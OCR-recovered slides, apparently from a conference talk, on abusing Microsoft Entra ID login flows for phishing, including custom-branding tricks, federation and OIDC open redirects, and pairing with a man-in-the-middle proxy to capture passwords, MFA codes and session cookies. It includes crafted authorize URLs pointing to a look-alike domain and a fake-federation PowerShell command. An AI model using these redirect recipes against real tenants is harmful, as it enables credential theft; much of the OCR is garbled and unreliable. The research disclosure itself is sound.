> Recovered by OCR — confidence 96/100 on the text kept, 96/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Getting started
Default
Browser language customizations
Layout
Header
= Multiple Custom CSS files in single tenant!
for a subset of end
Footer
Hidden
Hidden
```

## Slide 70

-

-

-

-

-


> Recovered by OCR — confidence 74/100 on the text kept, 64/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
lc=<id> e 4 uthe a y enter the
n't
refresh the
```

## Slide 71

•

-


> Recovered by OCR — confidence 89/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Browser language customizations
Sim Connectez-vous a votre compt |_x
Does also influence page
title sadly
Might not be noticed by the
user at this point? Mic
Approve sign in request
? Swipe down to
equ...
*
- a
```

## Slide 72

## Slide 73


> Recovered by OCR — confidence 95/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Summary
Federation Redirect
OIDC Redirect URL Prompt=None
OIDC Redirect URL Scope=Invalid
Self-Service Sign Up
Custom CSS Button Hijack
PTA + Custom Font
Double PTA Auth with image swap
PTA + Mobile App MFA Image
Instant Open Redirect
Instant Open Redirect
Redirect after successful auth
Capture pass + OTP MFA after sign in
Redirect after username entered
Capture cleartext password
Capture password + OTP MFA
Capture Password + Show MFA Prompt
```

## Slide 74

•

-

-

-

-


> Recovered by OCR — confidence 89/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
¢ login.microsoftonline.com
e Is a free redirector for phishing pages
¢ Can serve any image as if it is Imgur
¢ Is the most trusted credential harvester by far
Is the perfect all-in-one Phishing-as-a-Service platform!
```

## Slide 75

-

-

-

-

-

-

-


> Recovered by OCR — confidence 75/100 on the text kept, 65/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
References CQ spotit
@
¢ Dr. Azure AD - Nestori Syynimaa
« XPN - Adam Chester
¢ EvilGinx (Pro) - Kuba Gretzky
```

## Slide 76

-

-

-

-

-

-

-

-


> Recovered by OCR — confidence 75/100 on the text kept, 57/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
OO
Connect
¢ LinkedIn
e httos://www.linkedin.com/in/keanunys/
¢ Discord
° #redbyte1337
RESEARCHER
```

## Slide 77


> Recovered by OCR — confidence 76/100 on the text kept, 63/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
07
vee Federation — Open Redirect
a
```

## Slide 78


> Recovered by OCR — confidence 93/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Regular Federation Flow Ospotit
On-Prem AD Federation Server User Entra ID
1. Start sign in
v
2. Redirect to Federation
Server for authentication
3. User provides
credentials
4. Credentials
validated against
on prem AD
v
5. Redirect to Entra ID
with SAML Response
6. Issue token &
Redirect to App
»
```

## Slide 79


> Recovered by OCR — confidence 77/100 on the text kept, 52/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Configure Federation for Domain spotit
@
PS C:\> New-MgDomainFederationConfiguration ~
>>
>>
>>
UPS8a
>> -—-FederatedIdpMfaBehavior "rejectMfaByFederatedIdp" ~
>> —-DisplayName "Fake ADFS Federation"
“https: //Login . fake-microsoft .com/defcon—demo? i=crt4IMQRWAipvT3Ww5b0—-Ff—sN9kYHtSEdKunQT_8NH1Co8_
```

## Slide 80


> Recovered by OCR — confidence 93/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Status
Federated
Primary
) spotit
```

## Slide 81

-

→


> Recovered by OCR — confidence 93/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Login_hint parameter O spotit
login hint optional You can use this parameter to pre-fill the username and email address field of
the sign-in page for the user. Apps can use this parameter during
reauthentication, after already extracting the login hint optional claim from
an earlier sign-in.
https://login.microsoftonline.com/
1. Entra ID sees attacker.com domain is configured for Federation
2. Instant redirect to Sign In URL of Federated domain
* Provides email address in the request!
> Allows to obtain the victim email address for pre-filling on phishing page
```

## Slide 82


> Recovered by OCR — confidence 95/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Abusing Federation Flow as Open Redirect spotit
Entra ID Attacker Server User Entra ID
1. User clicks on
crafted URL
2. Redirect to Attacker
Server for authentication
3. MitM legitimate login
page (e.g. EvilGinx)
4. User signs in with
password + MFA
A
5. Intercept Session
Cookies
6. Redirect User
```

## Slide 83


> Recovered by OCR — confidence 85/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
localhost > []
https: //Login.microsoftonline.co
```

## Slide 84

## Slide 85


> Recovered by OCR — confidence 90/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Register an application
* Name
The u
tenant)
in any organizational di 5 D tenant - Multitenant)
zational ory (Any M ) tenant - Multite
Redirect URI (optional)
```

## Slide 86

•

→


> Recovered by OCR — confidence 89/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
OIDC Redirect — Create sign-in URL Ospotit
https://login.microsoftonline.com/common/oauth2/v2.9/authorize
?client_id=<attacker-app-client-id>
&response_type=code&scope=openid
&state=user@VictimOrg.com
&redirect_uri=https://login.fake-microsoft.com/
¢ Victim email can be tracked in state parameter
> Allows to pre-filling username on phishing page
```

## Slide 87


> Recovered by OCR — confidence 86/100 on the text kept, 76/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
HH Sign in to your account x +
```

## Slide 88


> Recovered by OCR — confidence 92/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
+ Consent and permissions | User consent settings
sent to applications, and when
o data hem acquire
ed carefully
our organization's data.
y will be re
) spotit
```

## Slide 89


> Recovered by OCR — confidence 93/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
OIDC Redirect — Prompt=None
@
prompt
optional
Indicates the type of user interaction that is required. Valid values are login,
none, consent, and select_account .
- prompt=login forces the user to enter their credentials on that request,
negating single-sign on.
- prompt=none is the opposite. It ensures that the user isn't presented with any
interactive prompt. If the request can't be completed silently by using single-
sign on, the Microsoft identity platform returns an interaction required error.
- prompt=consent triggers the OAuth consent dialog after the user signs in,
asking the user to grant permissions to the app.
- prompt=select_account interrupts single sign-on providing account selection
experience listing all the accounts either in session or any remembered
account or an option to choose to use a different account altogether.
```

## Slide 90


> Recovered by OCR — confidence 89/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
spotit
error or it MAY ignore it; in practice, not returning errors for not-understood values will help facilitate phasing
extensions using new a values.
prompt
OPTIONAL. Space-delimited, case-sensitive list of ASCII string values that specifies whether the Aut!
Server prompts the End-User for reauthentication and consent. The defined values ari
none
The Authorization Server MUST NOT display any authentication or consent user interface pages.
An error is returned if an End-User is not already authenticated or the Client does not have pre-
configured consent for the requested Claims or does not fulfill other conditions for processing
the request. The error code will typically be 1 _ r
another code defined in Section 3.1.2.6. This can be used as a method to chec
authentication and/or consent.
login
The Authorization Server SHOULD prompt the ["4-!!eer far raauthanticatinn TE it cannat
concen rent the End-User, it MUST return 3 4 9 3. Authorization Server Authenticates End-User
The Authorization Server SHOULD prompt the _
information to the Client. If it cannot obtain c If the requ
is Authenticated, depending upon the request parameter valu
select_account Authenticate the End- username and p <i ri yond the scope of this specification.
The Authorization Server SHOULD prompt the
an End-User who has multiple accounts at the ending upon the request parameter
* The Authenticati t ontains paramet
Server MUST reautl -Us the End-U:
The Authorization Server MUST NOT interact with the End-Use
When intera g e l e Authorization Server MUST employ appropriate measures
tequest Forgery and Clickjacki ins is 10.12 and 10.13 of uth 2.0 [RFC
```

## Slide 91

→ → →


> Recovered by OCR — confidence 84/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
OIDC Redirect — Prompt=None spotit
https://login.microsoftonline.com/common/oauth2/v2.9/authorize
?client_id=<attacker-app-client-id>
&response_type=code&scope=openid
&state=user@VictimOrg.com
&redirect_uri=https://login.fake-microsoft.com/
&prompt=none
1. First time access to cross-tenant app will always require consent!
> User interaction required for consent
2. No interaction allowed by prompt=none
> Instant redirect to Redirect URI ae ;
> Even if consent settings configured with : “Do not allow user consent”! a _
```

## Slide 92


> Recovered by OCR — confidence 94/100 on the text kept, 74/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
| paused
| microsoft-jul ...
: sessions
[23:54:47] [inf] no saved sessions found
```

## Slide 93


> Recovered by OCR — confidence 92/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
OIDC Redirect — Invalid Scope )spotit
If an error occurs at any time
(e.g. invalid scope), the user
should still be redirect to the
redirect URL!
4.1.2.1. Error Response
If the request fails dite to a missing, invalid, or mismatching
redirection URI, or if tfie client identifier is missing or invalid,
the authorization server SRQULD inform the resource owner of the
error and MUST NOT automaticaily redirect the user-agent to the
invalid redirection URI.
If the resource owner denies the ackess request or if the request
fails for reasons other than a missing or invalid redirection URI,
the authorization server informs the cM¥ent by adding the following
parameters to the query component of the redirection URI using the
"application/x-www-form-urlencoded" format, per Appendix B:
error
REQUIRED. A single ASCII [USASCII] error code from the
following:
invalid_scope
The requested scope is invalid, unknown, or malformed.
state
REQUIRED if a "state" parameter was present in the client
authorization request. The exact value received from the
client.
```

## Slide 94

→ →


> Recovered by OCR — confidence 87/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
OIDC Redirect — Invalid Scope Ospotit
https://login.microsoftonline.com/common/oauth2/v2.9/authorize
?client_id=<attacker-app-client-id>
&response_type=code
&state=user@VictimOrg.com&login_hint=user@VictimOrg.com
&redirect_uri=https://login.fake-microsoft.com/
&prompt=login&scope=invalid
1. “prompt=login” forces to show login page
2. After legitimate login, error occurs when Entra ID checks scope
> Instant redirect to Redirect URI! ot, _
> Even if consent settings configured with : “Do not allow user consent”! -
```

## Slide 95


> Recovered by OCR — confidence 90/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
File Machine View Input Devices Help
File Actions Edit View Help
You've gone Incognito
Others who use this device won't see your activity, so you can browse more privately. This won't
change how data is collected by websites that you visit and the services that they use, including
Google. Downloads, bookmarks and reading list items will be saved. Learn more
Chromium won't save: Your activity might still be visible to:
* Your browsing history ‘* Websites that you visit
* Cookies and site data * Your employer or school
* Information entered in forms * Your Internet service provider
® Third-party cookies are blocked
When you're in Incognito mode, sites can't use third-party cookies. If a site that relies on
these cookies isn’t working, you can try giving that site temporary access to third-party
cookies.
e *Untitled 1- Mousepad
File Edit Search View Document Help
authorize?client_id=bbe32cca-
uri=https: //login. fake-microsoft.com/defcon-demo?
cun=189WPdphWP4MCGFAf z8yuVaEIogS6BW1s6ZBURLS7p2ny583LpF-
n3n64-
ytQww. onmicrosoft.com&prompt=Login&scope=invalid|
```

## Slide 96

-

-


> Recovered by OCR — confidence 88/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
OIDC Redirect — Invalid Scope: Advantages CO) spotit
1. User only redirected after authentication on legitimate
login.microsoftonline.com domain
* Could add extra credibility for certain pretexts
¢* For example: Password expired
2. No consent prompt or block page is shown to the user.
```

## Slide 97

-

-

-

-

-

-

-

-


> Recovered by OCR — confidence 71/100 on the text kept, 54/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
¢ LinkedIn
e httos://www.linkedin.com/in/keanunys/
¢ Discord
° #redbyte1337
```
